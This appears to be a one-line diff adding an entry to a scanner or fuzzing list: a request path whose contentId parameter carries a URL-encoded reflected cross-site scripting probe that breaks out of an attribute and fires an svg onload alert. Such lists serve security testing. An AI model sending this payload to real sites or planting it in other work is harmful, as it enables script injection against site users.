@@ -1,0 +1,1 @@
+/control/stream?contentId=%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
